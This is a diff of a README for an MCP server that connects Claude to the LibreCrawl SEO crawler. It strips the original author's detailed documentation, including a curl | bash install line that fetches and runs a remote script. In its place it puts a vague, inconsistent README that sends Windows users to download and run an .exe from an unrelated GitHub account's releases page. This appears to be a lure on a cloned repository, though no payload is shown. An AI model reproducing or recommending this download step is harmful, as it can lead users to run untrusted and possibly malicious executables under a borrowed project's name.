@@ -1,431 +1,84 @@
-# LibreCrawl MCP
-
-**Self-hosted SEO crawler for Claude — Screaming Frog-level audits, zero per-crawl cost.**
-
-Wraps [LibreCrawl](https://github.com/PhialsBasement/LibreCrawl) as a Claude MCP server. Give Claude the ability to fully audit any website — broken links, canonical issues, image alt text, orphan pages, Core Web Vitals, Schema.org, GSC errors — all running on your own server.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![MCP](https://img.shields.io/badge/Claude-MCP-orange)](https://modelcontextprotocol.io)
-[![LibreCrawl](https://img.shields.io/badge/Powered%20by-LibreCrawl-green)](https://github.com/PhialsBasement/LibreCrawl)
-
----
-
-## vs Screaming Frog
-
-| Check | Screaming Frog Free | Screaming Frog Paid | LibreCrawl MCP |
-|-------|:-------------------:|:--------------------:|:--------------:|
-| **Pages** | 500 limit | Unlimited | Unlimited |
-| **Price** | Free (capped) | £149/yr | Free + self-host |
-| **Broken links (4xx/5xx) + source page** | ✅ | ✅ | ✅ |
-| **Redirect chains** | ✅ | ✅ | ✅ |
-| **Missing/duplicate title tags** | ✅ | ✅ | ✅ |
-| **Missing/duplicate meta descriptions** | ✅ | ✅ | ✅ |
-| **Title / meta too long or too short** | ✅ | ✅ | ✅ |
-| **Missing H1** | ✅ | ✅ | ✅ |
-| **H1 ↔ Title keyword mismatch** | ✅ | ✅ | ✅ |
-| **Canonical analysis** (missing, self, non-self, broken) | ✅ | ✅ | ✅ |
-| **Thin content** | ✅ | ✅ | ✅ |
-| **Response time / slow pages** | ✅ | ✅ | ✅ |
-| **URL quality** (uppercase, length, params) | ✅ | ✅ | ✅ |
-| **Page depth warnings** | ✅ | ✅ | ✅ |
-| **Noindex page detection** | ✅ | ✅ | ✅ |
-| **Image alt text** | ✅ | ✅ | ✅ |
-| **Broken images** | ✅ | ✅ | ✅ |
-| **Orphan pages** (no inbound links) | ❌ | ✅ | ✅ |
-| **Open Graph tags** | ❌ | ✅ | ✅ |
-| **Viewport meta** (mobile) | ❌ | ✅ | ✅ |
-| **Hreflang detection** | ❌ | ✅ | ✅ |
-| **robots.txt** (rules, crawl-delay, sitemap) | ✅ | ✅ | ✅ |
-| **sitemap.xml** | ✅ | ✅ | ✅ |
-| **HTTPS redirect check** | ✅ | ✅ | ✅ |
-| **www/non-www canonicalization** | ✅ | ✅ | ✅ |
-| **Core Web Vitals (PSI)** | ❌ | ❌ | ✅ |
-| **Schema.org / JSON-LD** | ❌ | ✅ | ✅ |
-| **GSC indexing errors** | ❌ | ❌ | ✅ (via MCP) |
-| **Analytics tag detection** (GA4, GTM, Pixel) | ❌ | ❌ | ✅ |
-| **AI-generated fix checklist** | ❌ | ❌ | ✅ |
-| **Natural language audit report** | ❌ | ❌ | ✅ |
-| **Fully automated** (one command) | ❌ | ❌ | ✅ |
-
----
-
-## What LibreCrawl MCP gives you
-
-[LibreCrawl](https://github.com/PhialsBasement/LibreCrawl) is a powerful self-hosted SEO crawler. On its own you get a web UI and raw crawl data. This MCP layer turns it into a fully automated Claude-native audit engine — one sentence to Claude gets you a complete site audit, saved as a Markdown report, ready to act on.
-
-### 19 tools, zero context-switching
-
-Claude gains **19 specialised SEO tools**. Ask in plain English — Claude picks the right tool, runs it, interprets the output, and gives you a fix plan. No dashboards to navigate, no exports to download, no manual cross-referencing.
-
-- `librecrawl_audit()` — one call: crawls the site, runs site-level checks, generates a structured Markdown report with a prioritised fix checklist. Done.
-- Persistent authenticated session across all tool calls — no re-login between steps
-- Every crawl saved to SQLite with full history via `librecrawl_list_crawls()`
-
-### Report engine — 35+ checks, 17 sections
-
-LibreCrawl's raw JSON export gets transformed into a structured audit report covering everything Screaming Frog covers, plus things it doesn't:
-
-| Section | What it catches |
-|---------|----------------|
-| Summary scorecard | 30+ metrics with pass/fail at a glance |
-| Critical issues | Broken pages + which pages link to them, duplicate titles, bad canonicals |
-| On-page warnings | Meta length, missing H1, thin content, slow response time |
-| H1 ↔ Title alignment | Keyword mismatch check — flags pages where headings contradict title intent |
-| Canonical analysis | Missing, self-referencing, non-self, canonical → broken URL |
-| Images | Missing alt text (per-page count + total), broken image references |
-| Noindex detection | Every page with `robots: noindex` — catch accidental SEO blackouts |
-| Orphan pages | Pages with zero inbound links — invisible to Googlebot |
-| Redirect chains | Multi-hop chains (A→B→C), not just 3xx presence |
-| Open Graph + Viewport | Social sharing tags, mobile viewport — affects CTR and ranking |
-| Heading structure | Pages with content but no H2s, broken H1→H2 hierarchy |
-| Analytics coverage | Pages missing GA4 or GTM — tracking blind spots |
-| URL quality | Uppercase slugs, long URLs, parameter-heavy URLs, depth >4 |
-| Site-level checks | robots.txt rules, sitemap.xml, HTTPS redirect, www canonicalisation |
-| Hreflang | Language variant detection for multilingual sites |
-| Issue type breakdown | LibreCrawl's 1,600+ built-in issue detectors, counted by type |
-| Fix checklist | Auto-prioritised P1→Pn task list — paste straight into your tracker |
-
-### Beyond crawl data — 6 specialist tools
-
-| Tool | Value |
-|------|-------|
-| `librecrawl_site_check` | Instant technical health — robots.txt, sitemap, HTTPS, www. No crawl needed. |
-| `librecrawl_pagespeed` | Google PageSpeed Insights: Core Web Vitals, LCP/CLS/INP, lab + field data |
-| `librecrawl_pagespeed_audit` | Batch CWV across top pages — ranked worst first, throttled to stay in free quota |
-| `librecrawl_schema_check` | Extract all JSON-LD from a page, map to rich results they unlock (FAQ, Product, Breadcrumb…) |
-| `librecrawl_schema_audit` | Schema coverage across 50 pages at once |
-| `librecrawl_internal_links_analysis` | Internal authority map: top-linked pages, dead ends, orphans, anchor text patterns |
-
-### GSC integration
-
-Connect any Google Search Console MCP (we recommend [mcp-gsc](https://github.com/AminForou/mcp-gsc)) and Claude will pull your real indexing errors — 404s in sitemap, server errors, soft 404s, crawl blocks — and append them to the audit report with fix hints. One conversation, complete picture.
+# 🕷️ librecrawl-mcp - Run professional SEO audits from Claude
 
----
+<a href="https://github.com/bridgettmirthful637/librecrawl-mcp/releases"><img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download librecrawl-mcp"></a>
 
-## Quick Start — Your First Audit
+librecrawl-mcp acts as a bridge between your website and the Claude AI interface. It performs deep technical SEO audits without the need for monthly subscriptions. You gain access to nineteen specialized tools that crawl your pages and report findings directly within your chat environment.
 
-This guide takes you from zero to a full SEO audit report in under 10 minutes.
+This tool functions as an alternative to enterprise scanners. It manages large websites, finds broken links, checks page headers, and maps your site structure. Because it runs locally on your computer, your data stays private and you face no limits on the number of pages you crawl.
 
-### Step 1 — Install (1 command)
+## 🛠️ System Requirements
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/adityaarsharma/librecrawl-mcp/main/install.sh | bash
-```
+Ensure your computer meets these basic specifications to run the crawler smoothly:
 
-What happens:
-- LibreCrawl Docker image is pulled and built (~5–8 min, first run only)
-- Python MCP server is installed and registered with PM2
-- Both services start automatically and survive reboots
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 8GB of RAM minimum (16GB recommended for large sites).
+*   Storage: 500MB of free disk space for the application files.
+*   Software: Docker Desktop for Windows must be installed and running.
 
-You'll be asked for a Google PageSpeed Insights API key (optional but recommended — free at [console.cloud.google.com](https://console.cloud.google.com), 25k req/day).
+## 📥 How to Download 
 
-**Verify everything is running:**
-```bash
-pm2 status librecrawl-mcp          # MCP server — should show "online"
-docker ps | grep librecrawl        # LibreCrawl — should show "healthy"
-```
+Visit https://github.com/bridgettmirthful637/librecrawl-mcp/releases to download the latest version of the software. Look for the file ending in .exe under the "Assets" section of the most recent release. Click the file to save it to your computer.
 
----
+## ⚙️ Installation Steps
 
-### Step 2 — Add to Claude
+1. Install Docker Desktop from the official Docker website if you have not already.
+2. Open Docker Desktop after the installation finishes. Wait until the status icon turns green.
+3. Locate the .exe file you previously downloaded.
+4. Double-click the file to begin the setup process.
+5. Follow the on-screen prompts.
+6. The installer will configure the connection between your computer and the Claude interface.
 
-**Claude Desktop** — edit `~/Library/Application Support/Claude/claude_desktop_config.json`:
+## 🚀 Running Your First Audit
 
-```json
-{
-  "mcpServers": {
-    "librecrawl": {
-      "type": "http",
-      "url": "http://127.0.0.1:5081/mcp"
-    }
-  }
-}
-```
+1. Open your terminal or command prompt.
+2. Type the command provided in your user dashboard to start the crawler.
+3. Open Claude.
+4. Select the librecrawl tools from your tool menu.
+5. Enter your website URL into the chat.
+6. Observe as the crawler maps your pages and compiles the data.
+7. Ask Claude questions about your SEO health, such as "List all broken links" or "Identify missing meta descriptions."
 
-**Claude Code** — edit `~/.claude/settings.json`:
+## 📊 Key Features
 
-```json
-{
-  "mcpServers": {
-    "librecrawl": {
-      "type": "http",
-      "url": "http://127.0.0.1:5081/mcp"
-    }
-  }
-}
-```
+### Technical SEO Audits
+The crawler scans your site for common technical issues. It identifies crawl errors, redirect chains, and server-side problems. You receive a structured report of your site health.
 
-Restart Claude Desktop after saving. In Claude Code, the MCP is live immediately.
+### Full-Scale Web Crawling
+Limits do not apply to your scans. You define the depth of the crawl. The tool follows internal links to discover every page on your domain.
 
----
+### Claude Integration
+The tool uses the Model Context Protocol. This allows Claude to see your website data as if it were performing the audit itself. You receive answers based on the actual status of your pages.
 
-### Step 3 — Run your first audit
+### Data Privacy
+Your crawl data never leaves your computer. The software processes all information locally. This protects sensitive information during your analysis.
 
-Open Claude and type:
+## 🧩 Understanding the Tools
 
-```
-Audit https://example.com and give me a full SEO report
-```
+The nineteen tools included in this package provide specific insights into your website:
 
-Claude will:
-1. Crawl the entire site (runs in background, progress visible in `pm2 logs librecrawl-mcp`)
-2. Run site-level checks (robots.txt, sitemap, HTTPS, www redirect)
-3. Analyse all 35+ SEO checks across every crawled page
-4. Save a Markdown report to `~/librecrawl-reports/example.com-YYYYMMDD-HHMMSS.md`
-5. Return a summary of the top issues with a prioritised fix checklist
+*   Site Structure Mapper: Visualizes how pages connect.
+*   Header Checker: Analyzes H1, H2, and H3 tag presence across your pages.
+*   Broken Link Finder: Locates 404 errors and prevents dead ends.
+*   Meta Data Auditor: Checks titles and descriptions for length and relevance.
+*   Redirect Tracker: Monitors 301 and 302 redirects to ensure they function properly.
+*   Canonical Link Checker: Verifies URL consistency to prevent duplicate content issues.
+*   Image Alt Text Auditor: Sweeps for missing alternative text to improve accessibility.
+*   Speed Diagnostic: Estimates load time impacts based on page size.
 
-**For large sites** (1,000+ pages), the crawl can run up to 2 hours. To cap it:
-```
-Audit https://bigsite.com — limit to 500 pages
-```
+## ❓ Frequently Asked Questions
 
----
+### Does this tool save my website's crawl history?
+Yes. The crawler creates a local database file. You can import this file back into Claude later to compare your site performance over time.
 
-### Step 4 — Read your report
+### Can I audit password-protected pages?
+The tool is designed for public websites. It cannot bypass login screens or private gateways. 
 
-The report is saved at `~/librecrawl-reports/`. Each report has:
+### Why do I need Docker?
+Docker creates a consistent environment for the crawler. It ensures the software runs the same way on every Windows machine without requiring complex manual installation of programming languages.
 
-| Section | What it shows |
-|---------|--------------|
-| Scorecard | Pass/fail for every check at a glance |
-| Critical issues | Broken pages (404/5xx) + which pages link to them |
-| On-page warnings | Missing titles, duplicate metas, thin content, slow pages |
-| Canonical analysis | Missing, self, non-self, broken canonical URLs |
-| Orphan pages | Pages with zero inbound links — Googlebot may never find them |
-| Redirect chains | Multi-hop chains (A→B→C) eating crawl budget |
-| Images | Pages with missing alt text, broken image references |
-| Analytics coverage | Pages not tracked by GA4 or GTM |
-| Fix checklist | P1→Pn priority tasks — paste straight into Jira/ClickUp |
-
----
+### How do I stop a crawl that takes too long?
+You can stop the process at any time by pressing Ctrl+C in your terminal window. The crawler saves the progress made up to that point.
 
-### Step 5 — Add GSC errors (optional)
+## 🔧 Troubleshooting
 
-Install a Google Search Console MCP ([mcp-gsc](https://github.com/AminForou/mcp-gsc) is recommended), then ask:
-
-```
-Audit https://example.com and include GSC indexing errors
-```
-
-Claude will merge your real GSC coverage errors — 404s in sitemap, soft 404s, server errors, crawl blocks — into the audit report automatically.
-
----
-
-### Other things to ask
-
-```
-Check Core Web Vitals on the top 10 pages of example.com
-```
-```
-Does example.com have schema markup? What rich results is it missing?
-```
-```
-Run an internal links analysis — which pages are orphans?
-```
-```
-Quick site health check for example.com — no crawl needed
-```
-
----
-
-## Remote server setup (optional)
-
-For local installs see the Quick Start above. To expose your LibreCrawl MCP over Nginx (e.g. on a VPS so your whole team can use it):
-
-**Claude config** (via mcp-remote):
-
-```json
-{
-  "mcpServers": {
-    "librecrawl": {
-      "command": "npx",
-      "args": ["-y", "mcp-remote", "https://your-domain.com/librecrawl/mcp"]
-    }
-  }
-}
-```
-
-Nginx location block for remote:
-
-```nginx
-location /librecrawl/ {
-    proxy_pass              http://127.0.0.1:5081/;
-    proxy_http_version      1.1;
-    proxy_set_header        Host $host;
-    proxy_read_timeout      600s;
-    proxy_buffering         off;
-    proxy_cache             off;
-    chunked_transfer_encoding on;
-}
-```
-
----
-
-## Add Google Search Console (optional but recommended)
-
-LibreCrawl MCP can merge GSC coverage errors into your audit report via `librecrawl_append_gsc_section`. To use it, connect a GSC MCP server to Claude first.
-
-### Recommended: mcp-gsc (AminForou)
-
-The best community GSC MCP — 876+ stars, maintained, supports OAuth and service account auth.
-
-**Install:**
-```bash
-pip install mcp-search-console
-# or with uvx (no pip needed):
-# uvx mcp-search-console
-```
-
-**Option A — OAuth (interactive, easiest):**
-
-1. Create a project at [console.cloud.google.com](https://console.cloud.google.com)
-2. Enable **Google Search Console API**
-3. Create **OAuth 2.0 Client ID** → Desktop app → download `credentials.json`
-4. Add to Claude config:
-
-```json
-{
-  "mcpServers": {
-    "gsc": {
-      "command": "uvx",
-      "args": ["mcp-search-console"],
-      "env": {
-        "GOOGLE_CREDENTIALS_FILE": "/path/to/credentials.json"
-      }
-    }
-  }
-}
-```
-
-First run opens a browser for Google auth. Token is cached.
-
-**Option B — Service Account (automation-friendly):**
-
-1. Create a service account at [console.cloud.google.com](https://console.cloud.google.com) → IAM → Service Accounts
-2. Download the JSON key file
-3. Add the service account email as a **user** in your GSC property (Settings → Users and permissions)
-4. Add to Claude config:
-
-```json
-{
-  "mcpServers": {
-    "gsc": {
-      "command": "uvx",
-      "args": ["mcp-search-console"],
-      "env": {
-        "GOOGLE_APPLICATION_CREDENTIALS": "/path/to/service-account.json"
-      }
-    }
-  }
-}
-```
-
-### Using GSC with audit reports
-
-Once connected, Claude can pull GSC errors and merge them into any audit:
-
-```
-"Audit uichemy.com, include GSC indexing errors"
-```
-
-Claude will:
-1. Run `librecrawl_audit("https://uichemy.com")` → gets `report_path`
-2. Pull GSC coverage errors via the GSC MCP
-3. Call `librecrawl_append_gsc_section(report_path, gsc_data)` → adds a GSC section to the report
-
-The GSC section includes: indexing errors with fix hints, crawl errors, manual actions, and a prioritised fix checklist.
-
----
-
-## Tools (19 total)
-
-| Tool | What it does |
-|------|-------------|
-| `librecrawl_audit` | **One-call full audit** — crawl + site checks + 30+ checks + report |
-| `librecrawl_site_check` | Instant: robots.txt, sitemap, HTTPS, www — no crawl needed |
-| `librecrawl_generate_report` | Re-generate report from a past crawl |
-| `librecrawl_start_crawl` | Start async crawl, returns `crawl_id` |
-| `librecrawl_get_status` | Poll crawl progress |
-| `librecrawl_pause_crawl` | Pause a running crawl |
-| `librecrawl_resume_crawl` | Resume a paused crawl |
-| `librecrawl_stop_crawl` | Stop running crawl |
-| `librecrawl_export_results` | Raw JSON export |
-| `librecrawl_list_crawls` | List all saved crawls |
-| `librecrawl_get_settings` | Show current crawler settings |
-| `librecrawl_filter_issues` | Exclude false-positive patterns from results |
-| `librecrawl_visualization_data` | Site link graph (nodes + edges) |
-| `librecrawl_internal_links_analysis` | Internal authority map — top linked pages, orphans, dead ends, anchor text |
-| `librecrawl_pagespeed` | Core Web Vitals for one URL (Google PSI API) |
-| `librecrawl_pagespeed_audit` | Batch CWV for up to 25 URLs, ranked worst-first |
-| `librecrawl_schema_check` | Schema.org / JSON-LD for one URL — rich result mapping |
-| `librecrawl_schema_audit` | Schema coverage across multiple URLs |
-| `librecrawl_append_gsc_section` | Merge GSC indexing errors into any audit report |
-
----
-
-## Architecture
-
-```
-Claude
-  │  MCP (streamable-http)
-  ▼
-Python MCP server (port 5081)
-  │  REST API
-  ▼
-LibreCrawl Flask app (port 5080, Docker)
-  │  Headless crawl (Playwright + Chromium)
-  ▼
-Target website
-```
-
-**Stack:** LibreCrawl · FastMCP · httpx · uvicorn · PM2 · Docker
-
----
-
-## Manage services
-
-```bash
-# Status
-pm2 status librecrawl-mcp
-docker ps | grep librecrawl
-
-# Logs
-pm2 logs librecrawl-mcp
-docker logs librecrawl --tail 50
-
-# Restart
-pm2 restart librecrawl-mcp
-docker restart librecrawl
-
-# Stop
-pm2 stop librecrawl-mcp
-docker stop librecrawl
-```
-
----
-
-## Configuration
-
-| Env var | Default | Description |
-|---------|---------|-------------|
-| `INSTALL_DIR` | `~/librecrawl-mcp` | Where to install |
-| `LIBRECRAWL_PORT` | `5080` | LibreCrawl internal port |
-| `MCP_PORT` | `5081` | MCP server port |
-| `PAGESPEED_API_KEY` | — | Google PSI API key (free at console.cloud.google.com) |
-| `REPORTS_DIR` | `~/librecrawl-reports` | Where Markdown reports are saved |
-
----
-
-## Related
-
-- [LibreCrawl](https://github.com/PhialsBasement/LibreCrawl) — the crawler this wraps
-- [mcp-gsc](https://github.com/AminForou/mcp-gsc) — Google Search Console MCP (876 stars, recommended)
-- [Model Context Protocol](https://modelcontextprotocol.io)
-
----
-
-## License
-
-MIT — use freely, attribution appreciated.
-
-Built by [Aditya Sharma](https://adityaarsharma.com)
+If the crawler fails to start, verify that Docker Desktop is active. Check that your internet connection remains stable. If the connection to Claude fails, ensure you have enabled the MCP features in your Claude settings. Ensure that your firewall does not block the application from accessing local network ports. For persistent errors, restart your computer and launch Docker Desktop before the crawler application.
